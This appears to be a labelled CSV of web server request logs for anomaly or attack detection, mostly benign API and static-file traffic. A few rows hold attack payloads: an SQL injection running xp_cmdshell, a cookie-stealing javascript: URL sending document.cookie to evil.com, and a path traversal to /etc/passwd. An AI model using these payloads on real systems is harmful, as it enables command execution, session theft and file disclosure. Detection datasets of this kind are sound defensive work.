record_id,timestamp,client_ip,field_a,field_b,field_c,field_d,field_e,field_f,is_anomaly
652681ed-9a88-4273-9766-70d6ef0d2181,2026-05-07 21:34:30,10[.]23[.]77[.]254,GET,/api/v1/users/settings?q[=]laptop,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,86.2,,0
9ef4dac3-58b3-4aaa-a6fd-765f87b6a752,2026-05-04 18:40:09,172[.]29[.]73[.]73,GET,/api/v1/auth/refresh,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",137.15,,0
d874868f-c694-4dde-819b-7b85b556b069,2026-05-05 14:14:53,10[.]16[.]220[.]42,GET,/api/v1/checkout,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",117.29,,0
276c83ea-03e3-488a-a761-f9d170ee4cf4,2026-05-08 12:12:51,172[.]26[.]105[.]98,POST,/wp-login.php,ALLOW,sqlmap/1.7.11#stable (https://sqlmap.org),64.54,,0
a4fccde2-6fda-4e56-ac5d-83c7b2449d16,2026-05-04 08:53:14,192[.]168[.]15[.]167,GET,/api/v1/categories?page[=]6&limit[=]20,ALLOW,"Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",94.13,,0
16a62198-c7b2-4750-9a5f-d78fed73bf38,2026-05-03 14:33:32,192[.]168[.]20[.]113,GET,/api/v1/products/808,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",89.14,,0
c7163db1-2225-4743-a64b-4457d2c75d44,2026-05-09 17:58:39,10[.]6[.]45[.]95,OPTIONS,/api/v1/notifications,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,118.16,,0
4139e1ba-9e30-4e5f-8b2c-4a9c6a9f74f9,2026-05-04 09:16:29,192[.]168[.]7[.]105,POST,/api/v1/dashboard/stats?category[=]beauty,ALLOW,"Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",81.84,,0
d9b572c1-4289-4d7e-8190-5448092fe408,2026-05-08 14:49:59,192[.]168[.]10[.]55,GET,/api/v1/products/9845,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",184.01,,0
d21bc66f-09f2-4d23-bf84-4492f7dcca89,2026-05-03 14:53:50,172[.]23[.]82[.]233,GET,/api/v1/orders,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",107.89,,0
b65f6a57-f31a-40a7-9e9d-63c7527c542d,2026-05-10 12:22:25,192[.]168[.]10[.]253,PATCH,/contact,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",250.78,,0
a1f4eed6-a55c-4d54-b05a-20b031a56854,2026-05-12 20:11:30,192[.]168[.]8[.]139,GET,/api/v1/dashboard/stats,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,56.96,,0
b8579957-abe4-4c8f-bc77-9c85d6fef584,2026-05-06 14:15:15,192[.]168[.]6[.]158,GET,/manifest.json,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",113.82,,0
07254cee-79df-4fe3-8c99-8ba0310b237c,2026-05-02 16:44:14,172[.]28[.]196[.]150,POST,/api/v1/users/addresses,ALLOW,Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot),42.96,,0
6bc81d8d-71b6-4e6f-ad26-aac2a8846bd6,2026-05-05 11:13:26,192[.]168[.]10[.]12,GET,/api/v1/checkout,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",115.45,,0
5a3b8700-6138-46af-bf17-ad8b94e26eb4,2026-05-02 05:12:01,192[.]168[.]5[.]62,GET,/api/v1/dashboard/widgets,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",59.91,,0
e89cf97a-03a5-420d-badd-d02d268e4424,2026-05-09 10:19:38,10[.]12[.]39[.]154,GET,/careers,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,143.87,,0
816a4304-4ea4-4735-993e-7e85ac443f67,2026-05-09 03:20:43,172[.]27[.]22[.]73,GET,/api/v1/categories?sort[=]created_desc,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",74.1,,0
d50c707e-c4d4-4f9d-ae53-2b2e82569b82,2026-05-08 11:48:29,192[.]168[.]10[.]6,GET,/api/v1/checkout,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,57.78,,0
0b7a45c5-673f-475a-9f1d-f1d1c8808c2d,2026-05-12 16:30:32,192[.]168[.]5[.]195,GET,/api/v1/recommendations,ALLOW,Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot),148.59,,0
bb0c255b-5f81-43fd-b748-441f9200c67e,2026-05-14 17:39:39,192[.]168[.]19[.]246,POST,/api/v1/cart/items?page[=]4,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",175.88,,0
e78ca17b-8583-4eb6-902b-2ab68a4221e4,2026-05-12 13:03:54,10[.]13[.]3[.]112,GET,/api/v1/cart/items?id[=]1; EXEC xp_cmdshell[(][']whoami['][)]--,BLOCK,python-requests/2.31.0,74.34,,1
0514c2ed-3478-4380-95e5-9c71dbc1b7d1,2026-05-01 11:25:35,172[.]21[.]29[.]73,GET,/api/v1/orders?sort[=]price_asc,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",58.22,,0
26d852bd-16d7-42a2-8076-fbd01601dc77,2026-05-04 17:35:44,10[.]40[.]72[.]135,GET,/api/v1/wishlist?page[=]3&sort[=]name&limit[=]10,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,202.85,,0
2c072a10-8043-494c-9982-8d10f1557ecf,2026-05-05 15:02:15,10[.]6[.]155[.]65,GET,/api/v1/users/settings,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",111.4,,0
25e77bee-3ae3-4063-b8f5-74ddcc227028,2026-05-03 17:18:53,128[.]109[.]176[.]231,GET,/static/js/vendor.js,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",78.69,,0
c75cf479-7b7c-463a-b452-b02cc3b87122,2026-05-13 22:35:50,172[.]27[.]22[.]73,POST,/static/js/app.js,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",39.36,,0
e5598797-1cb9-4c9f-8606-e078d7aaa094,2026-05-08 14:19:06,10[.]16[.]189[.]94,GET,/privacy,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",109.08,,0
7d8164eb-c62e-4210-ae92-ef783a49568c,2026-05-01 15:12:43,192[.]168[.]2[.]218,GET,/static/css/main.css,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",107.54,,0
c056e16f-8aa4-437f-80c1-fb0ce3e71a20,2026-05-09 10:56:44,172[.]24[.]105[.]227,POST,/robots.txt,ALLOW,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0,78.29,,0
0ca95f24-c424-410e-8160-e84bf2c38a04,2026-05-08 12:17:51,10[.]26[.]27[.]34,GET,/static/img/hero.webp,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",229.39,,0
0dd70a0c-7955-4c2a-b16d-ed5ddcfabbde,2026-05-03 09:34:33,181[.]157[.]28[.]6,GET,/api/v1/products?page[=]8,ALLOW,"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",90.39,,0
ba1ea0c9-9f1e-4b69-b288-553f3d033e67,2026-05-03 12:58:56,129[.]138[.]24[.]162,GET,/api/v1/auth/login,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",28.81,,0
360dcd42-ae56-47dc-9f0c-22d57361a0e3,2026-05-05 13:36:27,192[.]168[.]11[.]177,POST,/api/v1/admin/login,ALLOW,Mozilla/5.0 (compatible; Acunetix-WVS),91.17,,0
a034f694-c2f3-4b0c-9069-c1d80a957425,2026-05-14 08:29:08,192[.]168[.]5[.]60,GET,/api/v1/notifications?filter[=]active,ALLOW,axios/1.6.7,36.75,,0
4b714abf-edd2-41e7-8631-036ed45b857c,2026-05-11 14:28:29,192[.]168[.]12[.]80,GET,/api/v1/users/profile?url[=]javascript:document.location[=][']http://evil.com/?c[=][']+document.cookie,ALLOW,Java/17.0.2,168.82,,1
cc268447-83b0-4467-b34e-6d9db186985c,2026-05-03 07:46:20,192[.]168[.]0[.]77,GET,/static/css/theme.css,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",199.22,,0
12b9a482-ba10-4404-9231-a2c846eef777,2026-05-06 16:33:18,172[.]21[.]114[.]42,GET,/static/js/app.js,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",192.59,,0
a93e22de-6cb7-4a71-855c-b723892b835c,2026-05-10 09:06:56,10[.]28[.]67[.]225,GET,/api/v1/products?sort[=]created_desc,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,188.5,,0
a552dcc8-85dc-402d-8460-a5e9cb6b8d19,2026-05-08 10:17:55,172[.]22[.]252[.]191,GET,/api/v1/orders/1310?page[=]9&limit[=]20,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",105.72,,0
6416adbc-9754-4b07-b925-b2c0a18b8706,2026-05-14 10:10:38,192[.]168[.]4[.]245,GET,/static/css/main.css,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",82.42,,0
e208a6f1-3d13-4e1b-be55-f192df0a90e1,2026-05-14 11:55:09,192[.]168[.]16[.]167,GET,/api/v1/categories,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",84.22,,0
06614d15-ee0c-41a9-be70-90d0d1f680e0,2026-05-04 12:15:15,192[.]168[.]5[.]195,GET,/static/css/theme.css,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",290.13,,0
3a19ba1e-37b8-4ccd-8605-535917e31508,2026-05-06 12:26:55,192[.]168[.]16[.]6,GET,/api/v1/orders/6558?page[=]4&limit[=]20,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",186.88,,0
4225df6f-f321-4497-baac-6c943ce31825,2026-05-01 13:15:27,172[.]28[.]196[.]150,GET,/api/v1/notifications?category[=]toys,ALLOW,Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot),114.23,,0
839625ef-8cd0-463a-9be5-f6ee31d2c075,2026-05-03 11:34:16,10[.]46[.]120[.]131,GET,/blog,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",383.16,,0
cf753126-9fcd-4b4f-84d1-96ad3ffef9d1,2026-05-03 07:53:53,192[.]168[.]3[.]185,GET,/docs,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",66.88,,0
11ab326e-bea4-4edd-9064-81753394d967,2026-05-09 12:00:18,192[.]168[.]3[.]74,DELETE,/api/v1/recommendations?filter[=]active,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",24.24,,0
cda95a15-5a66-48e4-948d-1791cdb6f998,2026-05-12 14:41:50,192[.]168[.]19[.]153,GET,/privacy,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",238.05,,0
76f458ce-ca8e-4c66-a309-ba0a6f5b3f0c,2026-05-13 10:12:56,157[.]80[.]227[.]85,POST,/static/css/theme.css,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",58.64,,0
bb9935cb-482b-46b9-94e0-bf70adf30f95,2026-05-10 12:22:29,192[.]168[.]9[.]249,GET,/api/v1/auth/login,ALLOW,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),96.24,,0
4198e6e1-994c-4c29-a99d-0c449f637ef7,2026-05-04 07:24:51,192[.]168[.]0[.]30,POST,/static/img/hero.webp,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",175.99,,0
38005667-27f4-4b2d-89b6-7e947ef45495,2026-05-10 07:02:45,192[.]168[.]10[.]166,POST,/api/v1/products/8883,ALLOW,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),346.69,,0
c099463f-6623-4237-99d3-9ae5f9f76b5c,2026-05-05 08:44:23,192[.]168[.]4[.]177,GET,/api/v1/cart/items?page[=]18&limit[=]20,ALLOW,PostmanRuntime/7.36.0,124.31,,0
1e62a33c-065a-44fa-901b-ba5682f44033,2026-05-02 12:38:14,192[.]168[.]16[.]47,PUT,/api/v1/dashboard/widgets?filter[=]active,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",477.07,,0
f78c7f00-deff-49fc-a66b-0d64ee4d2ca9,2026-05-07 04:22:14,192[.]168[.]3[.]89,PATCH,/static/js/vendor.js,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",77.18,,0
4206db30-8aec-4138-bc48-cfc3e91e7628,2026-05-11 13:23:34,192[.]168[.]10[.]253,POST,/static/img/banner.jpg,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",197.75,,0
a0b60dfe-c036-4456-ad77-468edc352a1e,2026-05-03 09:15:08,192[.]168[.]15[.]34,GET,/api/v1/users/addresses,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",30.62,,0
6ad5ea2b-c33b-46c4-b458-a036fc514e36,2026-05-01 17:12:25,10[.]4[.]87[.]38,GET,/api/v1/reviews,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",174.77,,0
72c4ba6b-d276-482d-ae8a-4abf768f69f8,2026-05-05 16:08:16,192[.]168[.]6[.]86,GET,/%2e%2e/%2e%2e/etc/passwd,BLOCK,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",136.59,,1
1f10bfdd-93c5-4087-aa55-b498aa60f586,2026-05-10 09:56:17,192[.]168[.]3[.]89,POST,/api/v1/reviews,ALLOW,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),87.61,,0
0fb04046-372a-44a9-89af-799934e9f612,2026-05-13 19:06:22,192[.]168[.]19[.]246,GET,/api/v1/recommendations?page[=]12,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",71.95,,0
482cde62-db27-4cda-a158-30dea8473a28,2026-05-13 08:17:28,192[.]168[.]19[.]246,GET,/api/v1/search?page[=]17,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",165.55,,0
c2763e29-ad9a-48b3-97fe-5568af348a7b,2026-05-10 18:14:08,10[.]43[.]214[.]12,GET,/privacy,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",66.65,,0
a7a07440-a1bf-43cd-a5ac-b71dcff7440c,2026-05-14 16:44:04,192[.]168[.]16[.]174,GET,/api/v1/users/settings?sort[=]created_desc,ALLOW,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),178.58,,0
2a354ffa-8c57-4507-80b6-6a5cadc54477,2026-05-10 11:26:39,192[.]168[.]5[.]223,GET,/api/v1/products?q[=]jacket,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",154.5,,0
969f138d-2bc5-4079-a5ef-63932901a696,2026-05-08 21:29:18,54[.]11[.]110[.]131,GET,/api/v1/products,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",219.74,,0
b2f85205-ff13-49d5-8c7f-81ccd40b3208,2026-05-04 23:48:50,192[.]168[.]12[.]246,GET,/api/v1/search,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",84.83,,0
6327d2e1-61ed-45ea-bc6f-1205573dd772,2026-05-14 14:36:50,192[.]168[.]20[.]15,GET,/blog,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",168.27,,0
3c59eb73-2b33-409a-8bc3-3785c09dea34,2026-05-04 10:08:04,192[.]168[.]2[.]15,GET,/static/img/hero.webp,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,139.29,,0
709ec32d-95fd-4cc4-a80c-84a66d954d6e,2026-05-06 15:27:08,188[.]5[.]124[.]104,POST,/api/v1/recommendations?page[=]8&limit[=]20,ALLOW,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",132.59,,0
0bc0a346-7f2d-4bdb-a979-b42b897d0f55,2026-05-13 14:09:51,192[.]168[.]10[.]253,GET,/static/fonts/inter.woff2,ALLOW,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",78.68,,0
ac143a32-6f97-4872-b158-9ee9514acb0e,2026-05-14 18:09:36,172[.]27[.]22[.]73,GET,/api/v1/checkout,ALLOW,PostmanRuntime/7.36.0,223.09,,0
1189ff5a-235e-4f30-b86e-052a1dd171ed,2026-05-06 17:21:10,10[.]21[.]195[.]158,GET,/static/css/print.css,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",113.19,,0
d3584896-870c-4c4c-abed-c119c1abf249,2026-05-14 13:46:19,33[.]17[.]178[.]149,GET,/static/fonts/inter.woff2,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",142.67,,0
01678f78-8830-4106-a91e-28034ecd1f76,2026-05-04 17:40:51,172[.]19[.]245[.]69,GET,/api/v1/orders?sort[=]price_asc,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,164.92,,0
067ee338-9b8d-4092-a6e4-3984d3945114,2026-05-06 11:33:21,192[.]168[.]11[.]23,GET,/docs,ALLOW,"Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",260.15,,0
307d2e68-d954-4e8e-9b6f-645f72d1b545,2026-05-05 17:59:24,192[.]168[.]6[.]164,POST,/privacy,ALLOW,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",200.54,,0
9173a7d8-10d2-4cad-9521-5a629f35092f,2026-05-04 07:47:54,10[.]28[.]57[.]42,GET,/api/v1/users/settings,ALLOW,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0,265.85,,0
2d0c3c72-9847-4916-a550-26b884577b0e,2026-05-02 16:49:39,192[.]168[.]12[.]161,GET,/api/v1/dashboard/widgets?sort[=]created_desc,ALLOW,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",82.07,,0
bc14feac-1e00-446a-906f-f1a08cdbf0cc,2026-05-01 18:45:55,172[.]27[.]22[.]73,GET,/api/v1/payments/methods,ALLOW,PostmanRuntime/7.36.0,69.54,,0
5b8e0648-63b1-4378-bd0a-58cbdd8d4616,2026-05-07 10:04:02,172[.]20[.]44[.]32,GET,/pricing,ALLOW,Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0,566.85,,0
